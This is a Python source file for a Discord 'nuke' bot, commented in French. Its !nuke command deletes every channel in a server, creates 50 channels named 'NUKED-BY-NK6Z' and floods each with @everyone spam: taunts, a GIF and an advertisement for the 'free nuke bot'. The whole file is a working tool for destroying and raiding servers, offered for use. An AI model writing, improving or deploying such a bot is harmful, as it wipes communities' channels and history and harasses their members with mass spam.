import discord
from discord.ext import commands
import asyncio
import os
import webserver
from dotenv import load_dotenv

load_dotenv()  # charge les variables du fichier .env

TOKEN = os.getenv('DISCORD_TOKEN')


# Définir l'intent pour le bot (assurez-vous que les intents nécessaires sont activés)
intents = discord.Intents.default()
intents.message_content = True  # Permet de lire les messages
intents.members = True  # Permet de gérer les membres
intents.guilds = True  # Permet d'interagir avec les guildes

# Créer l'objet bot avec les intents
bot = commands.Bot(command_prefix="!", intents=intents)

# Lorsque le bot est prêt, afficher un message
@bot.event
async def on_ready():
    print(f"{bot.user} est connecté à Discord !")

# Commande !nuke avec un argument pour le nombre de messages à envoyer par canal
@bot.command(name="nuke")
@commands.has_permissions(administrator=True)  # Vérifie que l'utilisateur a les permissions nécessaires
async def nuke(ctx, message_count: int = 3):


    guild = ctx.guild
    tasks = []  # Liste pour collecter les tâches d'envoi de messages

    # Supprimer tous les canaux existants
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"🧨 Supprimé : {channel.name}")
        except Exception as e:
            print(f"[Erreur] Suppression salon : {e}")

    # Créer de nouveaux canaux de spam
    for i in range(50):  # Créer jusqu'à 100 canaux
        try:
            # Créer un nouveau canal de spam
            channel = await guild.create_text_channel(f"NUKED-BY-NK6Z")
            
            # Ajouter des tâches pour envoyer des messages multiples dans chaque canal
            for _ in range(20):
                tasks.append(channel.send("@everyone RECONSTRUISEZ BIEN LE SERVEUR MDRR"))
                tasks.append(channel.send("@everyone PLEURER BIEN"))
                tasks.append(channel.send("@everyone NK6Z ON TOP"))
                tasks.append(channel.send("https://tenor.com/view/anime-code-geass-laughing-laugh-gif-27600912"))
                tasks.append(channel.send("@everyone FREE NUKE BOT AT https://discord.gg/Va7uutCjhk"))

            
        except Exception as e:
            print(f"[Erreur] Création ou spam : {e}")

    # Attendre que toutes les tâches d'envoi de message soient terminées
    await asyncio.gather(*tasks)

    # Envoi d'un message de confirmation à l'utilisateur
    await ctx.send(f"OWNED BY NK6Z | {message_count * 3} messages envoyés dans chaque canal.")

webserver.keep_alive()
bot.run(TOKEN)





